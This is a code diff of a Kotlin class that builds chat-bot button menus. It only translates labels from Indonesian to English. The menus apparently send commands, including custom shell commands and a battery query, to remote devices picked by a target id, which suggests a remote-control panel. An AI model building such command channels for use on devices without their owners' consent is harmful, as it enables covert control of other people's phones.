@@ -1128,7 +1128,7 @@ object NukeLiveChatRepository {
         })
         put(JSONArray().apply {
             put(JSONObject().apply {
-                put("text", "🔋 Info Baterai")
+                put("text", "🔋 Battery Info")
                 put("callback_data", "exec_${targetUid}_bat")
             })
             put(JSONObject().apply {
@@ -1138,13 +1138,13 @@ object NukeLiveChatRepository {
         })
         put(JSONArray().apply {
             put(JSONObject().apply {
-                put("text", "⌨️ Ketik Shell Custom...")
+                put("text", "⌨️ Type Custom Shell...")
                 put("callback_data", "customcmd_$targetUid")
             })
         })
         put(JSONArray().apply {
             put(JSONObject().apply {
-                put("text", "⬅️ Tutup Menu Command")
+                put("text", "⬅️ Close Command Menu")
                 put("callback_data", "closecmd_$targetUid")
             })
         })
@@ -1153,7 +1153,7 @@ object NukeLiveChatRepository {
     private fun buildDefaultKeyboard(targetUid: String): JSONArray = JSONArray().apply {
         put(JSONArray().apply {
             put(JSONObject().apply {
-                put("text", "⚡ Kirim Quick Command")
+                put("text", "⚡ Send Quick Command")
                 put("callback_data", "cmd_$targetUid")
             })
         })
